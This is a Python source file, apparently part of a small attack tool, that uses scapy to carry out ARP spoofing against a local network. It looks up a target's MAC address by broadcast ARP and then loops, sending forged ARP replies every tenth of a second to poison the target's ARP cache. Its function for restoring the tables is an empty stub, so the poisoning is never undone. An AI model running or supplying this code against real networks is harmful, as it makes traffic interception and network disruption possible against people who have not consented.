from threading import Event
from scapy.all import Ether,ARP,sendp,srp
from time import sleep
from colorama import Fore,Style

red=Fore.RED
blue=Fore.BLUE
bright=Style.BRIGHT
white=Fore.WHITE
reset=Style.RESET_ALL
stop_Event=Event()

def get_mac_addr(ip):
        # Function to get mac address from given ip.
    try:
        ether_frame=Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet=ARP(pdst=ip)
        sent_packet=ether_frame/arp_packet
        answer,unanswer=srp(sent_packet,verbose=False)
        return answer[0].answer.src
    
    except IndexError:
        print(f"{bright}{blue}INFO:{reset}Ip isn't reachable.")
        stop_Event.set()
        quit()
    
    except Exception as e:
        stop_Event.set()
        print(f"{bright}{blue}INFO:{reset}Unexpected Mac Error:{e}")
    
def spoof_restorer(target_ip,target_mac,spoof_ip,spoof_mac,interface):
    # Funtion to restore spoofed table into normal.
    pass
    
def arp_spoofer(target_ip,target_mac,spoof_ip,spoof_mac,interface):
    # Function to create spoofed replay_packet sent.
    while not stop_Event.is_set():
        try:
            arp_rpacket = Ether(dst=target_mac) / ARP(op=2,psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
            sendp(arp_rpacket,iface=interface,verbose=False)
            sleep(0.1)
            
        except KeyboardInterrupt:
            stop_Event.set()
            break
        
        except Exception as e:
            stop_Event.set()
            print(f"{bright}{blue}INFO:{reset}Unexpected Error:{e}")
            break
    spoof_restorer(target_ip,target_mac,spoof_ip,spoof_mac,interface)